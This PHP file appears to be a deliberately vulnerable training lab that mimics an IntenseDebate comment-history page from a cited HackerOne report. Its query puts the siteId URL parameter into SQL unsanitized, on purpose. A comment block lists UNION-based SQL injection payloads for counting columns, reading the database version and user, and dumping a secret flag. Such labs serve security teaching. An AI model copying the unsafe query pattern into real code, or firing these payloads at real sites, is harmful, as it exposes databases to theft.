<?php
// ============================================================
// SQL Injection Lab 111 - UNION-based SQLi via URL siteId
// Platform: intensedebate.com | HackerOne Report #1046084
// Endpoint: GET /commenthistory/$siteId
// Vulnerability: siteId from URL used raw in SELECT query
// Payload: 1001 union select 1,2,@@VERSION#
//   → Injected row appears as a comment entry in the history list
// ============================================================

// --- Database Configuration ---
$server   = (getenv('DB_HOST') ?: (file_exists('/.dockerenv') ? 'krazeplanet' : '127.0.0.1'));
$username = "root";
$password = "";
$database = "KrazePlanet_DB";

$conn = mysqli_connect($server, $username, $password);
if (!$conn) die("Connection failed: " . mysqli_connect_error());

mysqli_query($conn, "CREATE DATABASE IF NOT EXISTS $database");
mysqli_select_db($conn, $database);

// --- Initialize Database ---
function initializeLab111Database($conn) {
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab111_comments (
        id INT AUTO_INCREMENT PRIMARY KEY,
        site_id INT NOT NULL,
        author VARCHAR(100) NOT NULL,
        comment TEXT NOT NULL,
        created_at DATETIME NOT NULL
    )");

    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab111_sites (
        id INT AUTO_INCREMENT PRIMARY KEY,
        site_id INT NOT NULL UNIQUE,
        site_name VARCHAR(100) NOT NULL,
        site_url VARCHAR(200) NOT NULL
    )");

    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab111_secret (
        id INT AUTO_INCREMENT PRIMARY KEY,
        secret_data VARCHAR(100) NOT NULL
    )");

    $check = mysqli_query($conn, "SELECT * FROM lab111_secret LIMIT 1");
    if (mysqli_num_rows($check) == 0) {
        mysqli_query($conn, "INSERT INTO lab111_secret (secret_data) VALUES ('flag{intensedebate_union_sqli_1046084}')");
    }

    $checkSites = mysqli_query($conn, "SELECT * FROM lab111_sites LIMIT 1");
    if (mysqli_num_rows($checkSites) == 0) {
        mysqli_query($conn, "INSERT INTO lab111_sites (site_id, site_name, site_url) VALUES
            (1001, 'KrazePlanet Blog', 'https://krazeplanet.com'),
            (1002, 'TechReview Weekly', 'https://techreviewweekly.net')");
    }

    $checkComments = mysqli_query($conn, "SELECT * FROM lab111_comments LIMIT 1");
    if (mysqli_num_rows($checkComments) == 0) {
        mysqli_query($conn, "INSERT INTO lab111_comments (site_id, author, comment, created_at) VALUES
            (1001, 'Alice M.', 'Great post! Really enjoyed reading through the analysis. Looking forward to the next part.', DATE_SUB(NOW(), INTERVAL 3 DAY)),
            (1001, 'Bob Carter', 'I disagree with the conclusion in paragraph 3. The data seems cherry-picked. Can you link sources?', DATE_SUB(NOW(), INTERVAL 2 DAY)),
            (1001, 'devguru99', 'Sharing this with my team — very useful breakdown of the architecture decisions.', DATE_SUB(NOW(), INTERVAL 1 DAY)),
            (1001, 'sarah_writes', 'This is exactly what I was looking for. Bookmarked!', DATE_SUB(NOW(), INTERVAL 5 HOUR)),
            (1002, 'JohnDoe42', 'First time visiting, will definitely be back. Love the writing style.', DATE_SUB(NOW(), INTERVAL 4 DAY)),
            (1002, 'TechLurker', 'The benchmark numbers here are outdated — these tests were run on gen 2 hardware.', DATE_SUB(NOW(), INTERVAL 3 DAY)),
            (1002, 'marina.dev', 'I ran into the same issue last month. The fix you described worked perfectly, thanks!', DATE_SUB(NOW(), INTERVAL 1 DAY))");
    }
}
initializeLab111Database($conn);

// --- Fetch sites for sidebar ---
$sites = [];
$siteRes = mysqli_query($conn, "SELECT site_id, site_name, site_url FROM lab111_sites ORDER BY site_id");
while ($row = mysqli_fetch_assoc($siteRes)) {
    $sites[] = $row;
}

// --- Handle siteId parameter ---
$rawSiteId   = $_GET['siteId'] ?? '';
$comments    = [];
$queryRan    = false;
$queryError  = '';

if ($rawSiteId !== '') {
    $queryRan = true;

    // ====================================================================
    // ⚠ VULNERABLE QUERY — siteId is taken directly from the URL and
    // interpolated raw into the SQL string without any sanitization.
    //
    // This is a UNION-based SQLi: injected rows are returned by the
    // query and rendered as comment entries in the history table.
    //
    // Payload examples (URL-encoded in browser, raw in Burp/curl):
    //
    //   Determine column count:
    //     ?siteId=1001 ORDER BY 3#         → no error (3 columns exist)
    //     ?siteId=1001 ORDER BY 4#         → error (only 3 columns)
    //
    //   Identify visible columns:
    //     ?siteId=0 union select 1,2,3#    → shows 1, 2, 3 in the rows
    //
    //   Extract DB version (matches report exactly):
    //     ?siteId=0 union select 1,2,@@VERSION#
    //     → "@@VERSION output" appears as the "comment" of a fake entry
    //
    //   Extract current DB user:
    //     ?siteId=0 union select 1,current_user(),@@VERSION#
    //
    //   Dump secret flag:
    //     ?siteId=0 union select 1,secret_data,2 from lab111_secret#
    // ====================================================================
    $sql = "SELECT id, author, comment FROM lab111_comments WHERE site_id = $rawSiteId";
    $result = mysqli_query($conn, $sql);

    if ($result === false) {
        $queryError = mysqli_error($conn);
    } else {
        while ($row = mysqli_fetch_assoc($result)) {
            $comments[] = $row;
        }
    }
}

// Find current site name for display
$currentSiteName = '';
$currentSiteUrl  = '';
foreach ($sites as $s) {
    if ((string)$s['site_id'] === $rawSiteId) {
        $currentSiteName = $s['site_name'];
        $currentSiteUrl  = $s['site_url'];
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Comment History — IntenseDebate</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;color:#2c3e50;font-size:14px;min-height:100vh;display:flex;flex-direction:column;}

/* ── Header ──────────────────────────────────────────────────────────────────── */
.header{background:#1e3a5f;border-bottom:3px solid #2980b9;position:sticky;top:0;z-index:100;}
.header-inner{max-width:1200px;margin:0 auto;padding:0 20px;display:flex;align-items:center;height:52px;gap:20px;}
.logo{display:flex;align-items:center;gap:0;text-decoration:none;}
.logo-intense{font-size:1.2rem;font-weight:800;color:#fff;letter-spacing:-.03em;}
.logo-debate{font-size:1.2rem;font-weight:300;color:#7fb3d3;letter-spacing:-.03em;}
.logo-by{font-size:.62rem;color:#6a8fa8;margin-left:8px;font-weight:500;border-left:1px solid #2e5f8a;padding-left:8px;line-height:1.2;}
.logo-automattic{display:block;font-size:.62rem;font-weight:700;color:#7fb3d3;}
.header-nav{display:flex;gap:0;margin-left:auto;}
.header-nav a{color:rgba(255,255,255,.75);font-size:.78rem;font-weight:500;text-decoration:none;padding:0 13px;line-height:52px;display:block;border-bottom:3px solid transparent;transition:color .15s,border-color .15s;margin-bottom:-3px;}
.header-nav a:hover{color:#fff;border-bottom-color:rgba(255,255,255,.35);}
.header-nav a.active{color:#fff;border-bottom-color:#2980b9;}
.header-user{display:flex;align-items:center;gap:8px;margin-left:16px;}
.user-avatar{width:30px;height:30px;background:#2980b9;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.75rem;font-weight:700;color:#fff;}
.user-name{font-size:.78rem;color:rgba(255,255,255,.85);}

/* ── Layout ──────────────────────────────────────────────────────────────────── */
.page-wrap{flex:1;max-width:1200px;margin:0 auto;padding:24px 20px;width:100%;display:flex;gap:20px;}
.sidebar{width:220px;flex-shrink:0;}
.main{flex:1;min-width:0;}

/* ── Sidebar ─────────────────────────────────────────────────────────────────── */
.sidebar-section{background:#fff;border:1px solid #dce1e8;border-radius:5px;margin-bottom:14px;overflow:hidden;}
.sidebar-title{font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#7a8fa0;padding:10px 14px;border-bottom:1px solid #f0f2f5;background:#f8f9fb;}
.sidebar-item{display:block;padding:9px 14px;border-bottom:1px solid #f5f6f8;text-decoration:none;color:#2c3e50;font-size:.8rem;transition:background .12s;}
.sidebar-item:last-child{border-bottom:none;}
.sidebar-item:hover{background:#f0f6fc;}
.sidebar-item.active{background:#e8f4ff;border-left:3px solid #2980b9;padding-left:11px;}
.sidebar-item-name{font-weight:600;color:#1e3a5f;display:block;margin-bottom:1px;}
.sidebar-item-id{font-size:.68rem;font-family:monospace;color:#95a5b5;}
.sidebar-nav-link{display:flex;align-items:center;gap:7px;padding:9px 14px;border-bottom:1px solid #f5f6f8;text-decoration:none;color:#3d5168;font-size:.8rem;transition:background .12s;}
.sidebar-nav-link:last-child{border-bottom:none;}
.sidebar-nav-link:hover{background:#f0f6fc;color:#1e3a5f;}
.sidebar-nav-link svg{width:14px;height:14px;flex-shrink:0;opacity:.6;}

/* ── Page header ─────────────────────────────────────────────────────────────── */
.page-header{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:16px;gap:12px;flex-wrap:wrap;}
.page-title{font-size:1.15rem;font-weight:700;color:#1e3a5f;}
.page-subtitle{font-size:.75rem;color:#7a8fa0;margin-top:2px;}
.path-pill{background:#1e3a5f;color:#7fb3d3;font-family:monospace;font-size:.68rem;padding:4px 10px;border-radius:3px;display:inline-block;margin-top:4px;}
.path-pill .path-id{color:#fff;font-weight:700;}

/* ── Filter bar ──────────────────────────────────────────────────────────────── */
.filter-bar{display:flex;align-items:center;gap:8px;margin-bottom:14px;flex-wrap:wrap;}
.filter-bar form{display:flex;gap:6px;align-items:center;}
.filter-input{padding:6px 10px;border:1px solid #ccd4dc;border-radius:3px;font-size:.78rem;color:#2c3e50;font-family:inherit;outline:none;width:160px;transition:border-color .15s;}
.filter-input:focus{border-color:#2980b9;box-shadow:0 0 0 2px rgba(41,128,185,.15);}
.btn-filter{background:#2980b9;color:#fff;border:none;border-radius:3px;padding:6px 14px;font-size:.78rem;font-weight:600;cursor:pointer;font-family:inherit;transition:background .15s;}
.btn-filter:hover{background:#1e6fa0;}
.filter-label{font-size:.75rem;color:#7a8fa0;}

/* ── Alert ───────────────────────────────────────────────────────────────────── */
.alert{border-radius:4px;padding:8px 12px;margin-bottom:12px;font-size:.78rem;display:flex;align-items:center;gap:7px;}
.alert-err{background:#fdf2f2;border:1px solid #f5c6c7;color:#c0392b;}
.alert-err svg{width:13px;height:13px;flex-shrink:0;}

/* ── Comment table ───────────────────────────────────────────────────────────── */
.comment-card{background:#fff;border:1px solid #dce1e8;border-radius:5px;overflow:hidden;}
.comment-card-header{padding:11px 16px;border-bottom:1px solid #eef0f3;display:flex;align-items:center;justify-content:space-between;background:#f8f9fb;}
.comment-card-title{font-size:.78rem;font-weight:700;color:#1e3a5f;display:flex;align-items:center;gap:6px;}
.comment-card-title svg{width:14px;height:14px;}
.comment-count{font-size:.7rem;color:#7a8fa0;font-weight:400;}
.comment-row{display:flex;align-items:flex-start;gap:12px;padding:13px 16px;border-bottom:1px solid #f2f4f7;transition:background .12s;}
.comment-row:last-child{border-bottom:none;}
.comment-row:hover{background:#fafbfd;}
.comment-avatar{width:34px;height:34px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:.75rem;font-weight:700;color:#fff;}
.comment-body{flex:1;min-width:0;}
.comment-author{font-size:.8rem;font-weight:700;color:#1e3a5f;margin-bottom:3px;}
.comment-text{font-size:.8rem;color:#4a5568;line-height:1.55;word-break:break-word;}
.comment-actions{display:flex;gap:6px;margin-top:6px;}
.btn-sm{font-size:.65rem;padding:2px 8px;border-radius:3px;border:1px solid #dce1e8;background:#fff;color:#5a6a7a;cursor:pointer;font-family:inherit;transition:all .12s;}
.btn-sm:hover{background:#f0f6fc;border-color:#2980b9;color:#2980b9;}
.btn-approve{border-color:#27ae60;color:#27ae60;}.btn-approve:hover{background:#f0fdf4;border-color:#27ae60;}
.btn-spam{border-color:#e74c3c;color:#e74c3c;}.btn-spam:hover{background:#fdf2f2;border-color:#e74c3c;}
.empty-state{padding:32px 16px;text-align:center;color:#95a5b5;}
.empty-state svg{width:32px;height:32px;margin:0 auto 8px;display:block;opacity:.4;}
.empty-state p{font-size:.82rem;}

/* ── Footer ──────────────────────────────────────────────────────────────────── */
.footer{background:#1e3a5f;color:rgba(255,255,255,.6);padding:16px 20px;margin-top:auto;font-size:.72rem;}
.footer-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;}
.footer a{color:rgba(255,255,255,.6);text-decoration:none;}.footer a:hover{color:#fff;}
.footer-links{display:flex;gap:14px;}
</style>
</head>
<body>

<!-- Header -->
<header class="header">
  <div class="header-inner">
    <a href="index.php" class="logo">
      <span class="logo-intense">Intense</span><span class="logo-debate">Debate</span>
      <span class="logo-by">by<span class="logo-automattic">Automattic</span></span>
    </a>
    <nav class="header-nav">
      <a href="index.php">Dashboard</a>
      <a href="#">Sites</a>
      <a href="index.php?siteId=1001" class="<?= $rawSiteId !== '' ? 'active' : '' ?>">Comments</a>
      <a href="#">Settings</a>
    </nav>
    <div class="header-user">
      <div class="user-avatar">F</div>
      <span class="user-name">fuzzme_test</span>
    </div>
  </div>
</header>

<!-- Page -->
<div class="page-wrap">

  <!-- Sidebar -->
  <aside class="sidebar">
    <div class="sidebar-section">
      <div class="sidebar-title">Navigation</div>
      <a href="index.php" class="sidebar-nav-link <?= $rawSiteId === '' ? 'active' : '' ?>">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
        Dashboard
      </a>
      <a href="#" class="sidebar-nav-link">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
        All Comments
      </a>
      <a href="#" class="sidebar-nav-link">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16v16H4z"/><path d="M4 10h16"/><path d="M10 4v16"/></svg>
        Moderation Queue
      </a>
    </div>

    <div class="sidebar-section">
      <div class="sidebar-title">My Sites</div>
      <?php foreach ($sites as $s): ?>
      <a href="index.php?siteId=<?= $s['site_id'] ?>" class="sidebar-item <?= $rawSiteId == $s['site_id'] ? 'active' : '' ?>">
        <span class="sidebar-item-name"><?= htmlspecialchars($s['site_name']) ?></span>
        <span class="sidebar-item-id">site_id: <?= $s['site_id'] ?></span>
      </a>
      <?php endforeach; ?>
    </div>
  </aside>

  <!-- Main -->
  <main class="main">

    <?php if ($rawSiteId === ''): ?>
    <!-- Dashboard home -->
    <div class="page-header">
      <div>
        <div class="page-title">Dashboard</div>
        <div class="page-subtitle">Welcome back, fuzzme_test. Select a site to view its comment history.</div>
      </div>
    </div>
    <div class="comment-card">
      <div class="comment-card-header">
        <div class="comment-card-title">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
          Getting Started
        </div>
      </div>
      <div style="padding:20px 16px;font-size:.82rem;color:#4a5568;line-height:1.7;">
        <p>Choose a site from the sidebar to view its <strong>comment history</strong>.</p>
        <p style="margin-top:8px;">The comment history URL follows the pattern:</p>
        <div style="margin-top:8px;"><span class="path-pill">/commenthistory/<span class="path-id">{siteId}</span></span></div>
      </div>
    </div>

    <?php else: ?>
    <!-- Comment history for siteId -->
    <div class="page-header">
      <div>
        <div class="page-title">
          Comment History<?= $currentSiteName ? ' — ' . htmlspecialchars($currentSiteName) : '' ?>
        </div>
        <div class="page-subtitle">
          <?= $currentSiteUrl ? htmlspecialchars($currentSiteUrl) : 'Viewing comments for the selected site.' ?>
        </div>
        <div class="path-pill">/commenthistory/<span class="path-id"><?= htmlspecialchars($rawSiteId) ?></span></div>
      </div>
    </div>

    <!-- Filter form -->
    <div class="filter-bar">
      <span class="filter-label">Jump to site:</span>
      <form method="GET" action="index.php">
        <input class="filter-input" type="text" name="siteId"
          value="<?= htmlspecialchars($rawSiteId) ?>"
          placeholder="Enter site ID…">
        <button class="btn-filter" type="submit">Go</button>
      </form>
    </div>

    <!-- Error display -->
    <?php if ($queryError): ?>
    <div class="alert alert-err">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
      SQL Error: <?= htmlspecialchars($queryError) ?>
    </div>
    <?php endif; ?>

    <!-- Comment list -->
    <?php
    $avatarColors = ['#2980b9','#8e44ad','#27ae60','#e67e22','#c0392b','#16a085','#d35400'];
    function avatarColor($name, $colors) {
        return $colors[abs(crc32($name)) % count($colors)];
    }
    ?>
    <div class="comment-card">
      <div class="comment-card-header">
        <div class="comment-card-title">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
          Comments
          <span class="comment-count">(<?= count($comments) ?> result<?= count($comments) !== 1 ? 's' : '' ?>)</span>
        </div>
      </div>

      <?php if (empty($comments) && !$queryError): ?>
        <div class="empty-state">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
          <p>No comments found for site_id <strong><?= htmlspecialchars($rawSiteId) ?></strong>.</p>
        </div>
      <?php endif; ?>

      <?php foreach ($comments as $c): ?>
      <?php
        $author = $c['author'] ?? '';
        $initial = strtoupper(mb_substr(strip_tags($author), 0, 1)) ?: '?';
        $color   = avatarColor($author, $avatarColors);
      ?>
      <div class="comment-row">
        <div class="comment-avatar" style="background:<?= $color ?>;"><?= htmlspecialchars($initial) ?></div>
        <div class="comment-body">
          <div class="comment-author"><?= htmlspecialchars($author) ?></div>
          <div class="comment-text"><?= htmlspecialchars($c['comment'] ?? '') ?></div>
          <div class="comment-actions">
            <button class="btn-sm btn-approve">Approve</button>
            <button class="btn-sm">Reply</button>
            <button class="btn-sm btn-spam">Spam</button>
            <button class="btn-sm">Delete</button>
          </div>
        </div>
      </div>
      <?php endforeach; ?>
    </div>

    <?php endif; ?>
  </main>
</div>

<footer class="footer">
  <div class="footer-inner">
    <span>IntenseDebate by <strong style="color:rgba(255,255,255,.8);">Automattic</strong> &nbsp;·&nbsp; Comment history endpoint: <code style="font-size:.7rem;opacity:.8;">/commenthistory/{siteId}</code></span>
    <div class="footer-links">
      <a href="https://hackerone.com/reports/1046084" target="_blank">HackerOne #1046084</a>
      <a href="#">Support</a>
      <a href="#">Privacy</a>
    </div>
  </div>
</footer>

</body>
</html>
